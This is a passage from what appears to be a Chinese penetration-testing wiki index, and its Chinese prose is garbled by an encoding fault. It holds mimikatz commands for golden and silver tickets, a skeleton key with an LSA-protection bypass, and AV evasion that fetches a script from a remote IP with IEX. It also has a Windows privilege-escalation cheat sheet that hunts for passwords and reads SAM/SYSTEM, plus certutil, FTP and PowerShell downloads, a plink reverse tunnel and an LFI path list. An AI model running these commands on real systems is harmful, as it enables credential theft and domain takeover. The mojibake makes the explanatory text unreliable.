/krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi Copy#å¯¼å…¥åˆšæ‰ç”Ÿæˆçš„ç¥¨æ®kerberos::ptt test.kiribi#å¯¼å…¥æˆåŠŸåå¯è·å–åŸŸç®¡æƒé™dir \\\\dc.abc.com\\c$ 5.2 ç™½é“¶ç¥¨æ®é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸€äº›åŒºåˆ«ï¼šGolden Ticketï¼šä¼ªé€ TGTï¼Œå¯ä»¥è·å–ä»»ä½• Kerberos æœåŠ¡æƒé™ï¼Œä¸”ç”± krbtgt çš„ hash åŠ å¯†ï¼Œé‡‘ç¥¨åœ¨ä½¿ç”¨çš„è¿‡ç¨‹éœ€è¦å’ŒåŸŸæ§é€šä¿¡ ç™½é“¶ç¥¨æ®ï¼šä¼ªé€  TGS ï¼Œåªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡ï¼Œä¸”ç”±æœåŠ¡è´¦å·ï¼ˆé€šå¸¸ä¸ºè®¡ç®—æœºè´¦æˆ·ï¼‰çš„ Hash åŠ å¯† ï¼Œé“¶ç¥¨åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸éœ€è¦åŒåŸŸæ§é€šä¿¡ Copy#åœ¨åŸŸæ§ä¸Šå¯¼å‡º DC$ çš„ HASHmimikatz log privilege::debug sekurlsa::logonpasswords#åˆ©ç”¨ DC$ çš„ Hashåˆ¶ä½œä¸€å¼  cifs æœåŠ¡çš„ç™½é“¶ç¥¨æ®kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt#cifsæ˜¯æŒ‡çš„æ–‡ä»¶å…±äº«æœåŠ¡ï¼Œæœ‰äº† cifs æœåŠ¡æƒé™ï¼Œå°±å¯ä»¥è®¿é—®åŸŸæ§åˆ¶å™¨çš„æ–‡ä»¶ç³»ç»Ÿdir \\\\DC.ABC.COM\\C$ 5.3 skeleton keyskeleton key(ä¸‡èƒ½é’¥åŒ™)å°±æ˜¯ç»™æ‰€æœ‰åŸŸå†…ç”¨æˆ·æ·»åŠ ä¸€ä¸ªç›¸åŒçš„å¯†ç ï¼ŒåŸŸå†…æ‰€æœ‰çš„ç”¨æˆ· éƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¯†ç è¿›è¡Œè®¤è¯ï¼ŒåŒæ—¶åŸå§‹å¯†ç ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œå…¶åŸç†æ˜¯å¯¹ lsass.exe è¿›è¡Œæ³¨ å…¥ï¼Œæ‰€ä»¥é‡å¯åä¼šå¤±æ•ˆã€‚ Copy#åœ¨åŸŸæ§ä¸Šå®‰è£… skeleton keymimikatz.exe privilege::debug misc::skeleton#åœ¨åŸŸå†…å…¶ä»–æœºå™¨å°è¯•ä½¿ç”¨ skeleton key å»è®¿é—®åŸŸæ§ï¼Œæ·»åŠ çš„å¯†ç æ˜¯ mimikatznet use \\\\WIN-9P499QKTLDO.adtest.com\\c$ mimikatz /user:adtest\\administrator å¾®è½¯åœ¨ 2014 å¹´ 3 æœˆ 12 æ—¥æ·»åŠ äº† LSA çˆ†æŠ¤ç­–ç•¥ï¼Œç”¨æ¥é˜²æ­¢å¯¹è¿›ç¨‹ lsass.exe çš„ä»£ç æ³¨å…¥ã€‚å¦‚æœç›´æ¥å°è¯•æ·»åŠ  skelenton key ä¼šå¤±è´¥ã€‚ Copy#é€‚ç”¨ç³»ç»Ÿwindows 8.1windows server 2012 åŠä»¥ä¸Š å½“ç„¶ mimikatz ä¾æ—§å¯ä»¥ç»•è¿‡ï¼Œè¯¥åŠŸèƒ½éœ€è¦å¯¼å…¥mimidrv.sysæ–‡ä»¶ï¼Œå¯¼å…¥å‘½ä»¤å¦‚ä¸‹: Copyprivilege::debug!+!processprotect /process:lsass.exe /remove misc::skeleton 5.4 MS14-068å½“æˆ‘ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªæ™®é€šåŸŸæˆå‘˜çš„è´¦å·åï¼Œæƒ³ç»§ç»­å¯¹è¯¥åŸŸè¿›è¡Œæ¸—é€ï¼Œæ‹¿åˆ°åŸŸæ§æœåŠ¡å™¨æƒé™ã€‚å¦‚æœåŸŸæ§æœåŠ¡å™¨å­˜åœ¨ MS14_068 æ¼æ´ï¼Œå¹¶ä¸”æœªæ‰“è¡¥ä¸ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ MS14_068 å¿«é€Ÿè·å¾—åŸŸæ§æœåŠ¡å™¨æƒé™ã€‚ MS14-068ç¼–å· CVE-2014-6324ï¼Œè¡¥ä¸ä¸º 3011780 ï¼Œå¦‚æœè‡ªæ£€å¯åœ¨åŸŸæ§åˆ¶å™¨ä¸Šä½¿ç”¨å‘½ä»¤æ£€æµ‹ã€‚ Copysysteminfo |find 3011780#ä¸ºç©ºè¯´æ˜è¯¥æœåŠ¡å™¨å­˜åœ¨MS14-068æ¼æ´ æ“ä½œé“¾æ¥ï¼šMS14-068å¤ç°(CVE-2014-6324)ï¼šhttps://www.cnblogs.com/-mo-/p/11890539.html 0x06 å…¶ä»–6.1 ä½¿ç”¨mimikatzå¯¼å‡ºchromeä¸­çš„å¯†ç è¯¦æƒ…è¯·è§ï¼šé“¾æ¥ 6.2 éšè—åŠŸèƒ½ç®¡ç†å‘˜å¸¸å¸¸ä¼šç¦ç”¨ä¸€äº›é‡è¦ç¨‹åºçš„è¿è¡Œï¼Œæ¯”å¦‚cmdã€regeditã€taskmgrï¼Œæ­¤æ—¶ä¸æ–¹ä¾¿æ¸—é€çš„è¿›ä¸€æ­¥è¿›è¡Œï¼Œè¿™é‡Œé™¤äº†å»æ”¹å›åŸæ¥çš„é…ç½®ï¼Œè¿˜å¯ä»¥å€ŸåŠ©mimikatzçš„ä¸€äº›åŠŸèƒ½ï¼š Copyprivilege::debugmisc::cmdmisc::regeditmisc::taskmgr 6.3 å…æ€å¤„ç†Powersploitä¸­æä¾›çš„å¾ˆå¤šå·¥å…·éƒ½æ˜¯åšè¿‡åŠ å¯†å¤„ç†çš„ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†ä¸€äº›ç”¨æ¥åŠ å¯†å¤„ç†çš„è„šæœ¬ï¼ŒOut-EncryptedScriptå°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚ é¦–å…ˆåœ¨æœ¬åœ°å¯¹Invoke-Mimikatz.ps1è¿›è¡ŒåŠ å¯†å¤„ç†ï¼š Copypoweshell.exe Import-Module .\\Out-EncryptedScript.ps1poweshell.exe Out-EncryptedScript -ScriptPath .\\Invoke-Mimikatz.ps1 -Password å¯†ç  -Salt éšæœºæ•°#é»˜è®¤ç”Ÿæˆçš„æ–‡ä»¶æ˜¯evil.ps1-Password è®¾ç½®åŠ å¯†çš„å¯†é’¥-Salt éšæœºæ•°ï¼Œé˜²æ­¢è¢«æš´åŠ›ç ´è§£ å°†åŠ å¯†ç”Ÿæˆçš„evil.sp1è„šæœ¬æ”¾åœ¨ç›®æ ‡æœºä¸Šï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š Copy#è¿œç¨‹åŠ è½½è§£å¯†è„šæœ¬poweshell.exe IEX(New-Object Net.WebClient).DownloadString(http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1)[String] $cmd = Get-Content .\\evil.ps1Invoke-Expression $cmd$decrypted = de password saltInvoke-Expression $decryptedInvoke-Mimikatz"},{"title":"Win_ä¿¡æ¯æ”¶é›†","path":"/wiki/å†…ç½‘/ææƒ/Win_ä¿¡æ¯æ”¶é›†.html","content":"æŒ‡å—æ¦‚è¿°åœ¨æ¯ä¸ªéƒ¨åˆ†ä¸­ï¼Œæˆ‘é¦–å…ˆæä¾›è€çš„å¯é çš„CMDå‘½ä»¤ï¼Œç„¶åæ˜¯ä¸€ä¸ªPowershellå®ç°çš„çš„ç­‰ä»·å‘½ä»¤ã€‚åŒæ—¶æ‹¥æœ‰è¿™ä¸¤ç§å·¥å…·æ˜¯éå¸¸å¥½çš„ï¼ŒPowershellæ¯”ä¼ ç»Ÿçš„CMDæ›´åŠ çµæ´»ã€‚ç„¶è€Œï¼Œæ²¡æœ‰ä¸€ä¸ªPowershellå‘½ä»¤èƒ½ç­‰ä»·äºæ‰€æœ‰ä¸œè¥¿ï¼ˆæˆ–è€…CMDåœ¨æŸäº›äº‹æƒ…ä¸Šä»ç„¶æ›´ç®€å•æ›´å¥½ï¼‰ï¼Œæ‰€ä»¥ä¸€äº›éƒ¨åˆ†å°†åªåŒ…å«å¸¸è§„çš„CMDå‘½ä»¤ã€‚ æ“ä½œç³»ç»Ÿæ“ä½œç³»ç»Ÿç±»å‹å’Œæ¶æ„ï¼Ÿå®ƒæ˜¯å¦ç¼ºå°‘ä»»ä½•è¡¥ä¸ï¼Ÿ systeminfowmic qfe ç¯å¢ƒå˜é‡æœ‰ä»€ä¹ˆæœ‰è¶£çš„åœ°æ–¹å—ï¼ŸåŸŸæ§åˆ¶å™¨åœ¨LOGONSERVERï¼Ÿ setGet-ChildItem Env: | ft Key,Value æœ‰æ²¡æœ‰å…¶ä»–è¿æ¥çš„é©±åŠ¨å™¨ï¼Ÿ net usewmic logicaldisk get caption,description,providernameGet-PSDrive | where $_.Provider -like Microsoft.PowerShell.Core\\FileSystem| ft Name,Root ç”¨æˆ· ä½ æ˜¯è°ï¼Ÿ whoamiecho %USERNAME%$env:UserName ç³»ç»Ÿä¸Šæœ‰å“ªäº›ç”¨æˆ·ï¼Ÿä»»ä½•æ—§çš„ç”¨æˆ·é…ç½®æ–‡ä»¶æ²¡æœ‰è¢«æ¸…ç†æ‰ï¼Ÿ net usersdir /b /ad C:\\Users\\dir /b /ad C:\\Documents and Settings\\ # Windows XP and belowGet-LocalUser | ft Name,Enabled,LastLogonGet-ChildItem C:\\Users -Force | select Name æ˜¯å¦æœ‰å…¶ä»–äººç™»å½•ï¼Ÿ qwinsta ç³»ç»Ÿä¸Šæœ‰å“ªäº›ç”¨æˆ·ç»„ï¼Ÿ net localgroupGet-LocalGroup | ft Name åœ¨ç®¡ç†å‘˜ç»„ä¸­æœ‰å“ªäº›ç”¨æˆ·ï¼Ÿ net localgroup AdministratorsGet-LocalGroupMember Administrators | ft Name, PrincipalSource ç”¨æˆ·è‡ªåŠ¨ç™»å½•å¯¹åº”çš„æ³¨å†Œè¡¨ä¸­æœ‰äº›ä»€ä¹ˆå†…å®¹ï¼Ÿ reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2nul | findstr DefaultUserName DefaultDomainName DefaultPasswordGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon | select Default* Credential Managerä¸­æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿ï¼Ÿ cmdkey /list æˆ‘ä»¬å¯ä»¥è®¿é—®SAMå’ŒSYSTEMæ–‡ä»¶å—ï¼Ÿ %SYSTEMROOT%\\repair\\SAM%SYSTEMROOT%\\System32\\config\\RegBack\\SAM%SYSTEMROOT%\\System32\\config\\SAM%SYSTEMROOT%\\repair\\system%SYSTEMROOT%\\System32\\config\\SYSTEM%SYSTEMROOT%\\System32\\config\\RegBack\\system ç¨‹åºï¼Œè¿›ç¨‹å’ŒæœåŠ¡ ç³»ç»Ÿéƒ½å®‰è£…äº†äº›ä»€ä¹ˆè½¯ä»¶ï¼Ÿ dir /a C:\\Program Filesdir /a C:\\Program Files (x86)reg query HKEY_LOCAL_MACHINE\\SOFTWAREGet-ChildItem C:\\Program Files, C:\\Program Files (x86) | ft Parent,Name,LastWriteTimeGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name æœ‰æ²¡æœ‰æƒé™è®¾ç½®çš„æ¯”è¾ƒè„†å¼±çš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶çš„æƒé™ï¼Ÿ åœ¨ç¨‹åºæ–‡ä»¶å¤¹ä¸­ï¼ˆProgram Foldersï¼‰æœ‰å“ªäº›æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹èµ‹äºˆäº†æ‰€æœ‰äººï¼ˆEveryoneï¼‰æˆ–ç”¨æˆ·ï¼ˆUserï¼‰çš„å®Œå…¨æƒé™ï¼Ÿ icacls C:\\Program Files\\* 2nul | findstr (F) | findstr Everyoneicacls C:\\Program Files (x86)\\* 2nul | findstr (F) | findstr Everyone icacls C:\\Program Files\\* 2nul | findstr (F) | findstr BUILTIN\\Usersicacls C:\\Program Files (x86)\\* 2nul | findstr (F) | findstr BUILTIN\\Users ä¿®æ”¹ç¨‹åºæ–‡ä»¶å¤¹ï¼ˆProgram Foldersï¼‰ä¸­çš„æ‰€æœ‰äººï¼ˆEveryoneï¼‰æˆ–ç”¨æˆ·ï¼ˆUserï¼‰çš„æƒé™ï¼Ÿ icacls C:\\Program Files\\* 2nul | findstr (M) | findstr Everyoneicacls C:\\Program Files (x86)\\* 2nul | findstr (M) | findstr Everyone icacls C:\\Program Files\\* 2nul | findstr (M) | findstr BUILTIN\\Usersicacls C:\\Program Files (x86)\\* 2nul | findstr (M) | findstr BUILTIN\\UsersGet-ChildItem C:\\Program Files\\*,C:\\Program Files (x86)\\* | % try Get-Acl $_ -EA SilentlyContinue | Where ($_.Access|select -ExpandProperty IdentityReference) -match Everyone catch Get-ChildItem C:\\Program Files\\*,C:\\Program Files (x86)\\* | % try Get-Acl $_ -EA SilentlyContinue | Where ($_.Access|select -ExpandProperty IdentityReference) -match BUILTIN\\Users catch ä½ ä¹Ÿå¯ä»¥ä¸Šä¼ Sysinternalsä¸­çš„accesschkæ¥æ£€æŸ¥å¯å†™æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ã€‚ accesschk.exe -qwsu Everyone *accesschk.exe -qwsu Authenticated Users *accesschk.exe -qwsu Users * ç³»ç»Ÿä¸Šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æœåŠ¡æœ‰å“ªäº›ï¼Ÿæœ‰æ²¡æœ‰æš´éœ²çš„å†…éƒ¨æœåŠ¡ï¼Ÿå¦‚æœæ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å¼€å®ƒå—ï¼Ÿè¯·å‚é˜…é™„å½•ä¸­çš„ç«¯å£è½¬å‘ã€‚ tasklist /svctasklist /vnet startsc queryGet-Process | ft ProcessName,IdGet-Service æ˜¯å¦å­˜åœ¨ä»»ä½•è„†å¼±çš„æœåŠ¡æƒé™ï¼Ÿæˆ‘ä»¬å¯ä»¥é‡æ–°é…ç½®ä»€ä¹ˆå—ï¼Ÿä½ å¯ä»¥å†æ¬¡ä¸Šä¼ accesschkæ¥æ£€æŸ¥æƒé™ã€‚ accesschk.exe -uwcqv Everyone *accesschk.exe -uwcqv Authenticated Users *accesschk.exe -uwcqv Users * æœ‰æ²¡æœ‰å¼•ç”¨çš„æœåŠ¡è·¯å¾„ï¼Ÿ wmic service get name,displayname,pathname,startmode 2nul |findstr /i Auto 2nul |findstr /i /v C:\\Windows\\\\ 2nul |findstr /i /v æ˜¯å¦è®¾ç½®äº†è®¡åˆ’ä»»åŠ¡ï¼Ÿä»»ä½•è‡ªå®šä¹‰å®ç°çš„è®¡åˆ’ä»»åŠ¡ï¼Ÿ schtasks /query /fo LIST 2nul | findstr TaskNamedir C:\\windows\\tasksGet-ScheduledTask | ft TaskName, State ç³»ç»Ÿå¯åŠ¨æ—¶éƒ½è¿è¡Œäº†äº›ä»€ä¹ˆï¼Ÿ wmic startup get caption,commandreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Runreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOncereg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOncedir C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startupdir C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\StartupGet-CimInstance Win32_StartupCommand | select Name, command, Location, User | flGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceGet-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunGet-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceGet-ChildItem C:\\Users\\All Users\\Start Menu\\Programs\\StartupGet-ChildItem C:\\Users\\$env:USERNAME\\Start Menu\\Programs\\Startup AlwaysInstallElevatedæ˜¯å¦å¯ç”¨ï¼Ÿæˆ‘æ²¡æœ‰è·‘è¿‡è¿™ä¸ªï¼Œä½†æ²¡æœ‰ä¼¤å®³æ£€æŸ¥ã€‚ reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated ç½‘ç»œ è¿æ¥åˆ°äº†å“ªä¸€å—ç½‘å¡ï¼Ÿæ˜¯å¦æœ‰å¤šä¸ªç½‘ç»œï¼Ÿ ipconfig /allGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address æˆ‘ä»¬æœ‰å“ªäº›ç½‘ç»œè·¯çº¿ï¼Ÿ route printGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex ARPç¼“å­˜ä¸­æœ‰ä»€ä¹ˆï¼Ÿ arp -aGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State æ˜¯å¦æœ‰è¿æ¥åˆ°å…¶ä»–ä¸»æœºçš„ç½‘ç»œè¿æ¥ï¼Ÿ netstat -ano hostsæ–‡ä»¶ä¸­çš„ä»»ä½•ä¸œè¥¿ï¼Ÿ C:\\WINDOWS\\System32\\drivers\\etc\\hosts é˜²ç«å¢™æ˜¯å¦æ‰“å¼€ï¼Ÿå¦‚æœæ˜¯åˆæ˜¯æ€æ ·é…ç½®çš„ï¼Ÿ netsh firewall show statenetsh firewall show confignetsh advfirewall firewall show rule name=allnetsh advfirewall export firewall.txt ä»»ä½•å…¶ä»–æœ‰è¶£çš„æ¥å£é…ç½®ï¼Ÿ netsh dump æœ‰æ²¡æœ‰SNMPé…ç½®ï¼Ÿ reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /sGet-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse æœ‰è¶£çš„æ–‡ä»¶å’Œæ•æ„Ÿä¿¡æ¯ è¿™éƒ¨åˆ†å†…å®¹çš„å‘½ä»¤è¾“å‡ºå¯èƒ½æœ‰ç‚¹æ‚ä¹±ï¼Œæ‰€ä»¥ä½ å¯èƒ½æƒ³æŠŠå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°txtæ–‡ä»¶ä¸­è¿›è¡Œå®¡æŸ¥å’Œè§£æã€‚ åœ¨æ³¨å†Œè¡¨ä¸­æ˜¯å¦æœ‰ä»»ä½•å¯†ç ï¼Ÿ reg query HKCU /f password /t REG_SZ /sreg query HKLM /f password /t REG_SZ /s æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ²¡æœ‰æ¸…ç†æ‰çš„sysprepæˆ–unattendedæ–‡ä»¶ï¼Ÿ dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2nulGet-Childitem â€“Path C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where ($_.Name -like *.xml -or $_.Name -like *.txt -or $_.Name -like *.ini) å¦‚æœæœåŠ¡å™¨æ˜¯IISç½‘ç»œæœåŠ¡å™¨ï¼Œé‚£ä¹ˆinetpubä¸­æœ‰ä»€ä¹ˆï¼Ÿä»¥åŠä»»ä½•éšè—çš„ç›®å½•ï¼Ÿweb.configæ–‡ä»¶ï¼Ÿ dir /a C:\\inetpub\\dir /s web.configC:\\Windows\\System32\\inetsrv\\config\\applicationHost.configGet-Childitem â€“Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue åœ¨IISæ—¥å¿—ç›®å½•ä¸­æœ‰äº›ä»€ä¹ˆæ–‡ä»¶ï¼Ÿ C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\W3SVC2\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\FTPSVC1\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\FTPSVC2\\u_ex[YYMMDD].log æ˜¯å¦å®‰è£…äº†XAMPPï¼ŒApacheæˆ–PHPï¼Ÿä»»ä½•æœ‰XAMPPï¼ŒApacheæˆ–PHPé…ç½®æ–‡ä»¶ï¼Ÿ dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnfGet-Childitem â€“Path C:\\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨ä»»ä½•Apacheç½‘ç»œæ—¥å¿—ï¼Ÿ dir /s access.log error.logGet-Childitem â€“Path C:\\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue ç³»ç»Ÿä¸­æ˜¯å¦ä»»ä½•æœ‰è¶£çš„æ–‡ä»¶ï¼Ÿå¯èƒ½åœ¨ç”¨æˆ·ç›®å½•ï¼ˆæ¡Œé¢ï¼Œæ–‡æ¡£ç­‰ï¼‰ï¼Ÿ dir /s *pass* == *vnc* == *.config* 2nulGet-Childitem â€“Path C:\\Users\\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue ç³»ç»Ÿä¸­æ˜¯å¦æœ‰åŒ…å«å¯†ç çš„æ–‡ä»¶ï¼Ÿ findstr /si password *.xml *.ini *.txt *.config 2nulGet-ChildItem C:\\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password é™„å½•ä¼ è¾“æ–‡ä»¶ åœ¨ç‰¹æƒå‡çº§è¿‡ç¨‹ä¸­çš„æŸä¸ªæ—¶å€™ï¼Œä½ éœ€è¦å°†æ–‡ä»¶æ”¾åˆ°ä½ çš„ç›®æ ‡ä¸Šã€‚ä¸‹é¢æ˜¯ä¸€äº›ç®€å•çš„æ–¹æ³•æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚ Powershell Cmdletï¼ˆPowershell 3.0åŠæ›´é«˜ç‰ˆæœ¬ï¼‰ Invoke-WebRequest https://myserver/filename -OutFile C:\\Windows\\Temp\\filename Powershellä¸€è¡Œä»£ç å®ç°æ–¹æ³•ï¼š (New-Object System.Net.WebClient).DownloadFile(https://myserver/filename, C:\\Windows\\Temp\\filename) Powershellè„šæœ¬ echo $webclient = New-Object System.Net.WebClient wget.ps1echo $url = http://IPADDRESS/file.exe wget.ps1echo $file = output-file.exe wget.ps1echo $webclient.DownloadFile($url,$file) wget.ps1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 é€šè¿‡æ–‡æœ¬æ–‡ä»¶çš„éäº¤äº’å¼FTPã€‚å½“ä½ åªæœ‰æœ‰é™çš„å‘½ä»¤æ‰§è¡Œæ—¶è¿™å¾ˆæœ‰ç”¨ã€‚ echo open 10.10.10.11 21 ftp.txtecho USER username ftp.txtecho mypassword ftp.txtecho bin ftp.txtecho GET filename ftp.txtecho bye ftp.txt ftp -v -n -s:ftp.txtCERTUTIL certutil.exe -urlcache -split -f https://myserver/filename outputfilename è½¬å‘ç«¯å£ è¿™å¯¹äºæš´éœ²æœºå™¨å¤–éƒ¨ä¸å¯ç”¨çš„å†…éƒ¨æœåŠ¡éå¸¸æœ‰ç”¨ï¼Œé€šå¸¸æ˜¯ç”±äºé˜²ç«å¢™è®¾ç½®ã€‚ ä¸Šä¼ plink.exeåˆ°ç›®æ ‡ã€‚ åœ¨æ”»å‡»æœºå™¨ä¸Šå¯åŠ¨SSHã€‚ ä¾‹å¦‚è¦å…¬å¼€SMBï¼Œåœ¨ç›®æ ‡ä¸Šè¿è¡Œï¼š plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS æ³¨æ„ï¼šä»Windows 10çš„ç§‹å­£åˆ›ä½œè€…æ›´æ–°ç‰ˆæœ¬å¼€å§‹ï¼ŒOpenSSHå·²ç»åœ¨Windowsçš„betaç‰ˆæœ¬ä¸­æ¨å‡ºï¼Œæ‰€ä»¥æˆ‘é¢„è®¡æœ‰ä¸€å¤©æˆ‘ä»¬å¯èƒ½åªèƒ½ä½¿ç”¨æ™®é€šçš„æ—§çš„SSHå‘½ä»¤è¿›è¡Œç«¯å£è½¬å‘ï¼Œå…·ä½“å–å†³äºæ˜¯å¦å¯ç”¨ã€‚ æœ¬åœ°æ–‡ä»¶åŒ…å«åˆ—è¡¨ è¿™ä¸æ˜¯ä¸€ä¸ªè¯¦å°½çš„åˆ—è¡¨ï¼Œå®‰è£…ç›®å½•ä¼šæœ‰æ‰€ä¸åŒï¼Œæˆ‘åªåˆ—å‡ºäº†ä¸€äº›å¸¸è§çš„æ–‡ä»¶è·¯å¾„ã€‚ C:\\Apache\\conf\\httpd.confC:\\Apache\\logs\\access.logC:\\Apache\\logs\\error.logC:\\Apache2\\conf\\httpd.confC:\\Apache2\\logs\\access.logC:\\Apache2\\logs\\error.logC:\\Apache22\\conf\\httpd.confC:\\Apache22\\logs\\access.logC:\\Apache22\\logs\\error.logC:\\Apache24\\conf\\httpd.confC:\\Apache24\\logs\\access.logC:\\Apache24\\logs\\error.logC:\\Documents and Settings\\Administrator\\NTUser.datC:\\php\\php.iniC:\\php4\\php.iniC:\\php5\\php.iniC:\\php7\\php.iniC:\\Program Files (x86)\\Apache Group\\Apache\\conf\\httpd.confC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\access.logC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\error.logC:\\Program Files (x86)\\Apache Group\\Apache2\\conf\\httpd.confC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\access.logC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\error.logc:\\Program Files (x86)\\php\\php.iniC:\\Program Files\\Apache Group\\Apache\\conf\\httpd.confC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\access.logC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\error.logC:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.confC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\access.logC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\error.logC:\\Program Files\\FileZilla Server\\FileZilla Server.xmlC:\\Program Files\\MySQL\\my.cnfC:\\Program Files\\MySQL\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.iniC:\\Program Files\\php\\php.iniC:\\Users\\Administrator\\NTUser.datC:\\Windows\\debug\\NetSetup.LOGC:\\Windows\\Panther\\Unattend\\Unattended.xmlC:\\Windows\\Panther\\Unattended.xmlC:\\Windows\\php.iniC:\\Windows\\repair\\SAMC:\\Windows\\repair\\systemC:\\Windows\\System32\\config\\AppEvent.evtC:\\Windows\\System32\\config\\RegBack\\SAMC:\\Windows\\System32\\config\\RegBack\\systemC:\\Windows\\System32\\config\\SAMC:\\Windows\\System32\\config\\SecEvent.evtC:\\Windows\\System32\\config\\SysEvent.evtC:\\Windows\\System32\\config\\SYSTEMC:\\Windows\\System32\\drivers\\etc\\hostsC:\\Windows\\System32\\winevt\\Logs\\Application.evtxC:\\Windows\\System32\\winevt\\Logs\\Security.evtxC:\\Windows\\System32\\winevt\\Logs\\System.evtxC:\\Windows\\win.iniC:\\xampp\\apache\\conf\\extra\\httpd-xampp.confC:\\xampp\\apache\\conf\\httpd.confC:\\xampp\\apache\\logs\\access.logC:\\xampp\\apache\\logs\\error.logC:\\xampp\\FileZillaFTP\\FileZilla Server.xmlC:\\xampp\\MercuryMail\\MERCURY.INIC:\\xampp\\mysql\\bin\\my.iniC:\\xampp\\php\\php.iniC:\\xampp\\security\\webdav.htpasswdC:\\xampp\\sendmail\\sendmail.iniC:\\xampp\\tomcat\\conf\\server.xml"},{"title":"æ— å­—æ¯","path":"/wiki/WP/REC/æ— å­—æ¯.html","content":"çŸ¥è¯†ç‚¹binä¸ºbinaryçš„ç®€å†™ï¼Œä¸»è¦æ”¾ç½®â¼€äº›ç³»ç»Ÿçš„å¿…å¤‡æ‰§â¾æ¡£ä¾‹å¦‚:catã€cpã€chmod 